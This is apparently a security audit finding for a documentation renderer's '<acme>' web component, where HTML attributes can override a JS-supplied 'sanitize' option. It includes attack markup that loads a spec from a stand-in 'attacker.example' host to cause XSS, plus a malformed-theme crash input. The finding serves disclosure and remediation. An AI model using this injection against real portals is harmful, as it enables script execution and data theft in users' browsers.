---
Title: HTML attributes on <acme> element always override JS-supplied options — trust boundary collapse for sanitize gate
Severity-Original: HIGH
Phase: 6
Class: hidden-control-channel
Endpoint: n/a (client-side renderer — no HTTP routes)
Handler: src/standalone.tsx:31-41,70
Verdict: VALID
Triage-Priority: P1
Triage-Exploitability: moderate
Triage-Impact: high
Triage-Reasoning: HTML attr override of sanitize=true enables XSS in portal origin; requires CMS raw-HTML write or DOM injection access
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
Debate:
Origin-Finding: Phase D7 systematic web-component attribute parsing audit
Deep-Probe-Corroboration: none (D6 not yet run)
Intent-Verdict: genuine
Intent-Source: none
Intent-Quote: n/a
Intent-Confidence: weak
PoC-Status: executed
PoC-Notes: Static execution against actual source; merge-order confirmed at standalone.tsx:70; argValueToBoolean("false")===false confirmed; all three scenarios (sanitize bypass, autoInit bypass, theme DoS) reproduce in Node.js simulation against real source tree
Protocol: local
Auth-Required: no
Auth-Roles-Required: anonymous
---

## Summary

`Acme.init()` merges options as `{ ...options, ...parseOptionsFromElement(element) }`, where `parseOptionsFromElement` reads every HTML attribute off the `<acme>` DOM element. Because the element-attribute object is spread **after** the JS-supplied options object, any HTML attribute on the `<acme>` element unconditionally overrides the corresponding JS option — including security-sensitive options such as `sanitize`.

This creates a trust-boundary collapse in CMS and platform contexts: if the embedding page allows the same principal who authored the OpenAPI spec to also set HTML attributes on the `<acme>` element (which is common in CMS systems that allow raw HTML in articles, or in iframe-less embedding where untrusted spec content is in the same DOM), that principal can disable sanitization even if the host application explicitly passed `sanitize: true` in its JS `options` argument.

## Evidence

**Merge order (standalone.tsx:70):**
```ts
options: { ...options, ...parseOptionsFromElement(element) },
```
The spread order is `JS options` first, then `element attributes` — element attributes win unconditionally.

**Attribute parsing (standalone.tsx:31-41):**
```ts
function parseOptionsFromElement(element: Element) {
  const attrMap = attributesMap(element);
  const res = {};
  for (const attrName in attrMap) {
    const optionName = attrName.replace(/-(.)/g, (_, $1) => $1.toUpperCase());
    const optionValue = attrMap[attrName];
    res[optionName] = attrName === 'theme' ? JSON.parse(optionValue) : optionValue;
  }
  return res;
}
```
There is no filtering or allowlist of attribute names. Every attribute becomes an option key. Including `sanitize`.

**Affected option normalization:**
`argValueToBoolean` treats any non-`"false"` string as `true` and any string `"false"` as `false` (AcmeNormalizedOptions.ts:76-83). Therefore `<acme sanitize="false">` sets `sanitize = false` exactly. An attacker who can write `<acme sanitize="false">` onto the DOM element defeats the JS `options.sanitize = true` protection.

- Guard stack observed: none — no filtering in `parseOptionsFromElement`
- Object-id parameter: n/a
- Ownership clause: n/a

## Attack Steps

**Scenario A — CMS raw HTML passthrough:**
1. Application embeds Acme via `Acme.init(specUrl, { sanitize: true }, element)` to protect against untrusted specs.
2. CMS allows content editors to insert raw HTML snippets in articles (common in WordPress, Contentful with raw HTML blocks, etc.).
3. An editor (or attacker who compromises an editor account) inserts `<acme sanitize="false" spec-url="https://attacker.example/malicious-spec.yaml">` anywhere in the DOM.
4. The application's auto-init or manual `init()` call picks up this element, reads `sanitize="false"` from attributes, and overrides the JS-supplied `sanitize: true`.
5. The malicious spec's Markdown descriptions render as raw HTML, executing XSS in the portal origin.

**Scenario B — autoInit with attacker-controlled element:**
1. `autoInit()` (standalone.tsx:102-111) automatically calls `init(specUrl, {}, element)` with an empty options object when a `<acme spec-url="...">` element is found on the page.
2. If an attacker can inject or modify the `<acme>` element's attributes (DOM XSS precondition, or CMS context), they control both `spec-url` (which spec loads) and all other options including `sanitize`.
3. No sanitization is applied by default (both JS options `{}` and absence of `sanitize` attribute → `false`).

**Scenario C — JSON.parse crash via malformed `theme` attribute:**
```html
<acme theme='{"invalid json}'>
```
Line 37: `res[optionName] = attrName === 'theme' ? JSON.parse(optionValue) : optionValue;` — this throws a `SyntaxError`, halting Acme initialization. A denial-of-service against the documentation page if an attacker can write attributes.

## Why This Passed SAST

The code is correct JavaScript. The override semantics of object spread are intentional for the feature (allowing HTML-attribute-based configuration). The security concern is architectural: the absence of a priority rule that preserves security-critical options from the JS caller.

## Recommended Fix

Apply a two-tier merge strategy: security-sensitive options supplied via JS should not be overridable by HTML attributes. Specifically:
```ts
const elementOptions = parseOptionsFromElement(element);
const securitySensitiveKeys = ['sanitize', 'untrustedSpec'];
// Remove any security-sensitive keys from element options to prevent override
for (const key of securitySensitiveKeys) {
  delete elementOptions[key];
}
options = { ...options, ...elementOptions };
```
Alternatively, change the merge order to `{ ...parseOptionsFromElement(element), ...options }` so JS-supplied options always win — though this breaks the expected HTML-attribute-based configuration for non-security options.

Additionally, add a console warning when a `sanitize` or `untrustedSpec` attribute is found on the element, to help developers discover unintended configurations.
